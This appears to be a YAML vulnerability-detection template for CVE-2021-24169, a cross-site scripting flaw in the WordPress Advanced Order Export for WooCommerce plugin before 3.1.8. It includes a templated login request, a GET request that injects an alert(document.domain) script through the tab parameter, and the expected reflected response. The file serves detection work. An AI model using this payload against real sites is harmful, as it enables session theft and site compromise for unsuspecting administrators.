id: CVE-2021-24169
info:
  name: WordPress Advanced Order Export For WooCommerce <3.1.8 - Authenticated Cross-Site
    Scripting
  author: r3Y3r53
  description: 'WordPress Advanced Order Export For WooCommerce plugin before 3.1.8
    contains an authenticated cross-site scripting vulnerability via the tab parameter
    in the admin panel. An attacker can inject arbitrary script in the browser of
    an unsuspecting user in the context of the affected site. This can allow the attacker
    to steal cookie-based authentication credentials and launch other attacks.

    '
  severity: medium
  impact: 'Authenticated users can execute arbitrary scripts on the affected WordPress
    site, leading to potential data theft, defacement, or further compromise.

    '
  remediation: Fixed in version 3.1.8.
  reference:
  - https://wpscan.com/vulnerability/09681a6c-57b8-4448-982a-fe8d28c87fc3
  - https://www.exploit-db.com/exploits/50324
  - https://wordpress.org/plugins/woo-order-export-lite/
  - https://nvd.nist.gov/vuln/detail/CVE-2021-24169
  - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-24169
    cwe-id: CWE-79
    epss-score: 0.0021
    epss-percentile: 0.58287
    cpe: cpe:2.3:a:algolplus:advanced_order_export:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: algolplus
    product: advanced_order_export
    framework: wordpress
  tags: cve2021,cve,wordpress,authenticated,wpscan,xss,wp-plugin,wp,woo-order-export-lite,edb,algolplus
traps:
- request:
    method: POST
    path: /wp-login.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'log={{username}}&pwd={{password}}&wp-submit=Log+In

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /wp-admin/admin.php?page=wc-order-export&tab=</script><script>alert(document.domain)</script>
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: <script>alert(document.domain)</script>woo-order-export-lite
